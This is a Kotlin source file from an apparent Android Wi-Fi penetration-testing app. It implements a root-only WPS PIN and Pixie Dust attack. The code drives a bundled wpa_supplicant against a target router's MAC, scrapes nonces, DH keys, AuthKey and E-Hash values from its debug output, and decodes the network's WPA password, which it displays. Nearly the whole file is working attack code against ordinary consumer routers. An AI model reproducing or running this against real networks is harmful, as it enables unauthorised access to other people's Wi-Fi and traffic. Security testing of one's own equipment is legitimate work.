package com.example.wifi_pentester.utils.pixieDustAttack

import android.content.Context
import android.util.Log
import com.example.wifi_pentester.utils.listeners.MessageListener
import com.example.wifi_pentester.utils.Serializer
import com.jaredrummler.android.shell.Shell
import com.jaredrummler.android.shell.Shell.Interactive
import org.apache.commons.codec.binary.Hex
import java.io.File
import java.io.FileOutputStream
import java.nio.charset.StandardCharsets

class WpsConnectRoot(private val context: Context, private val connectResult: WpsConnectResult) {
    enum class Status {
        Connection, Connected, Fail, Error, Closed
    }

    var status: Status? = null
        private set

    private var pixieWpsInfoLister = MessageListener { i: PixieWps -> }
    private var statusListener = MessageListener { i: Status -> }
    private var messageListener = MessageListener { i: String -> }
    private var resultListener = MessageListener { i: WpsConnectResult -> }
    private var wpaSupplicantConfigFile: File? = null
    private var socketDir: File? = null
    private var wpaSupplicant: Interactive? = null
    val pixieWps: PixieWps = PixieWps(context)
    private var isPixieDust = false

    fun setPixieWpsInfoLister(pixieWpsInfoLister: MessageListener<PixieWps>?) {
        if (pixieWpsInfoLister != null) this.pixieWpsInfoLister = pixieWpsInfoLister
    }

    fun setStatusListener(statusListener: MessageListener<Status>) {
        this.statusListener = statusListener
    }

    fun setMessageListener(messageListener: MessageListener<String>) {
        this.messageListener = messageListener
    }

    fun setResultListener(resultListener: MessageListener<WpsConnectResult>) {
        this.resultListener = resultListener
    }

    fun connect(wpsPin: Int, isPixieDust: Boolean) {
        this.isPixieDust = isPixieDust
        if (wpaSupplicant == null) {
            connectResult.wpsPin = wpsPin
            runWpaSupplicant()
        } else {
            status = Status.Error
            messageListener.toSend(" [!] Error: The process has already started\n")
            statusListener.toSend(status!!)
        }
    }

    private fun runWpaSupplicant() {
        val runWpaSupplicant = Thread {
            try {
                Shell.SU.run("svc wifi disable")
                messageListener.toSend(" [*] Testing...\n")
                messageListener.toSend(" [*] Wifi disabled\n")
                Thread.sleep(5000)
                if (!checkStatusWlan0()) {
                    Shell.SU.run("svc wifi enable")
                    messageListener.toSend(" [*] Wifi enabled\n")
                    Thread.sleep(5000)
                }
                if (checkStatusWlan0()) {
                    createTempFile()
                    val supplicandCmd = String.format("cd %s && ./wpa_supplicant -K -d -Dnl80211 -iwlan0 -c%s",
                            context.filesDir, wpaSupplicantConfigFile!!.absolutePath)
                    pixieWps.clear()
                    wpaSupplicant = Shell.Builder().useSU().addCommand(supplicandCmd).setOnStdoutLineListener { message: String -> parseWpaSupplicantMessage(message) }.open()
                    messageListener.toSend(" [*] Wpa_supplicant launched\n")
                    status = Status.Connection
                } else {
                    status = Status.Error
                    messageListener.toSend(" [!] Error: Failed launched Wpa_supplicant\n")
                }
            } catch (ex: Exception) {
                status = Status.Error
                messageListener.toSend(" [!] Error: Not found wireless interface wlan0!\n")
            }
            statusListener.toSend(status!!)
        }
        runWpaSupplicant.isDaemon = true
        runWpaSupplicant.start()
    }

    private fun parseWpaSupplicantMessage(message: String) {
        Log.e("WpaSupplicant", message)
        if (message == "EAPOL: disable timer tick") // переделать
        {
            val wpsRegMessage = String.format("WPS_REG,%s,%d", connectResult.mac, connectResult.wpsPin)
            if (socketDir != null) sendMessageToWpaSupplicant(wpsRegMessage)
            messageListener.toSend(" [*] Scanning...\n")
        } else if (message.contains("Enrollee Nonce") && message.contains("hexdump")) {
            pixieWps.eNonce = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("DH own Public Key") && message.contains("hexdump")) {
            pixieWps.pkr = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("DH peer Public Key") && message.contains("hexdump")) {
            pixieWps.pke = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("AuthKey") && message.contains("hexdump")) {
            pixieWps.authKey = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("E-Hash1") && message.contains("hexdump")) {
            pixieWps.eHash1 = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("E-Hash2") && message.contains("hexdump")) {
            pixieWps.eHash2 = getHex(message)
            messageListener.toSend(String.format(" [*] %s \n", message))
        } else if (message.contains("Network Key") && message.contains("hexdump")) {
            try {
                if(status == Status.Connected || status == Status.Closed) return;
                status = Status.Connected
                val bytes = Hex.decodeHex(getHex(message).toCharArray())
                connectResult.wpaPsk = String(bytes, StandardCharsets.UTF_8)
                resultListener.toSend(connectResult)
                messageListener.toSend(
                    " [*] Connected!\n" +
                    " [*] Name: ${connectResult.name}\n" +
                    " [*] WpsPin: ${connectResult.wpsPin}\n" +
                    " [*] Password: ${connectResult.wpaPsk}\n"
                )
                Serializer.Serialize(connectResult.wpsPin, String.format("wps_pin_%s", connectResult.mac), context)
                statusListener.toSend(status!!)
                close()
                Shell.SU.run("svc wifi enable")

            } catch (e: Exception) {
                status = Status.Error
                statusListener.toSend(status!!)
                close()
                e.printStackTrace()
            }
        } else if (message.contains("WPS-FAIL")) {
            if (status != Status.Fail && status != Status.Connected) {
                close()
                messageListener.toSend(String.format(" [*] %s \n", message))
                statusListener.toSend(Status.Fail)
                if (isPixieDust) {
                    pixieWpsInfoLister.toSend(pixieWps)
                }
            }
            status = Status.Fail
        } else if (message.contains("Received M")) {
            messageListener.toSend(String.format(" [*] %s \n", message))
        }
    }

    private fun sendMessageToWpaSupplicant(message: String) {
        val messageSenderCmd = String.format("cd %s && ./message_sender %s/wlan0 %s",
                context.filesDir.absolutePath, socketDir!!.absolutePath, message)
        val commandResult = Shell.SU.run(messageSenderCmd)
        if (commandResult.getStdout() == "Ok") {
            messageListener.toSend(String.format(" [*] Connecting to %s(%s)\n", connectResult.name, connectResult.mac))
            messageListener.toSend(String.format(" [*] Trying PIN %d\n", connectResult.wpsPin))
        } else {
            status = Status.Error
            messageListener.toSend(" [!] ERROR: Failed to connect to the socket\n")
            statusListener.toSend(status!!)
            close()
        }
    }

    private fun createTempFile() {
        try {
            if (socketDir == null) {
                socketDir = File(String.format("%s/socket%s", context.cacheDir, System.nanoTime()))
                socketDir!!.mkdir()
            }
            if (wpaSupplicantConfigFile == null) {
                wpaSupplicantConfigFile = File.createTempFile("WpaSuppliant", ".conf", context.cacheDir)
                val stream = FileOutputStream(wpaSupplicantConfigFile)

                val tempCfg = String.format("ctrl_interface=%s\nupdate_config=1\n", socketDir!!.absolutePath)
                val buff = tempCfg.toByteArray()
                stream.write(buff, 0, buff.size)
                stream.close()
            }
        } catch (ex: Exception) {
            messageListener.toSend(" [!] ERROR: Fail create temp file \n")
            ex.printStackTrace()
        }
    }

    private fun checkStatusWlan0(): Boolean {
        val result = Shell.SU.run(String.format("cd %s && ./iw dev", context.filesDir))
        val output = result.getStdout()
        return output != null && output.contains("wlan0")
    }

    private fun getHex(line: String): String {

        val lines = line.split(":", limit =  3).toTypedArray()
        return lines[2].replace(" ".toRegex(), "")
    }

    fun close() {
        if (wpaSupplicant != null && wpaSupplicant!!.isRunning) {
            wpaSupplicant!!.kill()
            wpaSupplicant = null
        }
        if (socketDir != null) {
            Shell.SU.run(String.format("rm -f -r %s", socketDir!!.absoluteFile.absolutePath))
            socketDir = null
        }
        if (wpaSupplicantConfigFile != null) {
            Shell.SU.run(String.format("rm -f -r %s", wpaSupplicantConfigFile!!.absoluteFile.absolutePath))
            wpaSupplicantConfigFile = null
        }
        pixieWps.close()
        status = Status.Closed
        statusListener.toSend(status!!)
        Shell.SU.run("svc wifi enable")
    }

    init {
        createTempFile()
    }
}